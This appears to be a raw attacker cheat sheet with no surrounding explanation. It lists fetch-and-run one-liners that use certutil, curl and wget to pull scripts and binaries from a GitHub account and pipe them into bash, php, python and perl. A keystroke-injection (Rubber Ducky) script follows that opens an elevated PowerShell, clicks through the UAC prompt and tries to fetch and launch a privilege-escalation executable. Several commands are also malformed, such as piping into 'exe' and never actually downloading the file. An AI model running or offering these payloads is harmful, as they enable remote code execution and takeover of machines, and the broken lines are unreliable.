
certutil -urlcache -split -f https://github.com/blkht666/so/rfi.sh | bash

curl https://github.com/blkht666/so/rfi.sh | bash

wget https://github.com/blkht666/so/rfi.sh | bash

certutil -urlcache -split -f https://github.com/blkht666/if/blob/master/up.php

curl https://github.com/blkht666/if/blob/master/up.php

wget https://github.com/blkht666/if/blob/master/up.php

certutil -urlcache -split -f https://github.com/blkht666/if/blob/master/feo.php | php

curl https://github.com/blkht666/if/blob/master/feo.php | php

wget https://github.com/blkht666/if/blob/master/feo.php | php

certutil -urlcache -split -f https://github.com/blkht666/dope/rfi.py | python

curl https://github.com/blkht666/dope/rfi.py | python

wget https://github.com/blkht666/dope/rfi.py | python

certutil -urlcache -split -f https://github.com/blkht666/nug/rfi.pl | perl

curl https://github.com/blkht666/nug/rfi.pl | perl

wget https://github.com/blkht666/nug/rfi.pl | perl

certutil -urlcache -split -f https://github.com/blkht666/lsd/rfi.exe | exe

curl https://github.com/blkht666/lsd/rfi.exe | exe

wget https://github.com/blkht666/lsd/rfi.exe | exe

REM start of script
REM
REM let the HID enumerate
DELAY 1000
GUI r
DELAY 200
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 1000
ALT y
DELAY 200
STRING $down = New-Object System.Net.WebClient; $url = 'https://github.com/realalexandergeorgiev/tempracer/releases/download/1/TempRacer.exe'; $file = 'tempracer.exe'; $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
